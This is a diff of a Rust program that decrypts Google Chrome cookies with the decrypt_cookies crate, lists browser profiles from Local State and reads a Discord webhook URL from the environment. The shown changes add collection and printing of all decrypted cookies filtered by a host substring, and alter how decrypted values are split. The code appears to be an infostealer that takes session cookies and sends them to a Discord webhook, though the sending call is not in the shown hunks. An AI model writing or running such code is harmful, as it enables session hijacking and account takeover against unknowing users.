@@ -1,6 +1,6 @@
 use std::{env, fs};
 
-use decrypt_cookies::{browser::info::ChromiumInfo, Browser, ChromiumBuilder, FirefoxBuilder};
+use decrypt_cookies::{browser::info::ChromiumInfo, Browser, ChromiumBuilder};
 use dirs::home_dir;
 use dotenv::dotenv;
 use serde_json::Value;
@@ -16,6 +16,14 @@ pub async fn main() -> miette::Result<()> {
     let discord_webhook_url =
         std::env::var("DISCORD_WEBHOOK_URL").expect("DISCORD_WEBHOOK_URL must be set.");
     let chromium = ChromiumBuilder::new(Browser::Chrome).build().await?;
+    let all_cookies = chromium.get_cookies_all().await?;
+    println!(
+        "{:?}",
+        all_cookies
+            .iter()
+            .filter(|c| c.host_key.contains("lvis"))
+            .collect::<Vec<_>>()
+    );
     let info = chromium.info();
     let local_state = fs::read_to_string(info.local_state()).unwrap();
     let v: Value = serde_json::from_str(&local_state).unwrap();
@@ -25,7 +33,6 @@ pub async fn main() -> miette::Result<()> {
         profiles.push(profile);
     }
     println!("{:?}", profiles);
-    let mut chromium = ChromiumBuilder::new(Browser::Chrome);
     let home_directory = home_dir().unwrap();
     let home_directory = home_directory.to_str().unwrap();
     let std_path = if env::consts::OS == "macos" {
@@ -74,7 +81,8 @@ pub async fn main() -> miette::Result<()> {
                                 .clone()
                                 .unwrap()
                                 .split("wB�I")
-                                .collect::<Vec<_>>()[1],
+                                .collect::<Vec<_>>()
+                                .join(" "),
                         ))
                     })
                     .await
@@ -94,7 +102,8 @@ pub async fn main() -> miette::Result<()> {
                             .clone()
                             .unwrap()
                             .split("wB�I")
-                            .collect::<Vec<_>>()[1]
+                            .collect::<Vec<_>>()
+                            .join(" ")
                     );
                 }
 
@@ -111,7 +120,8 @@ pub async fn main() -> miette::Result<()> {
                             .clone()
                             .unwrap()
                             .split("wB�I")
-                            .collect::<Vec<_>>()[1]
+                            .collect::<Vec<_>>()
+                            .join(" ")
                     );
                 }
                 println!("\n{:-^50}\n", "");
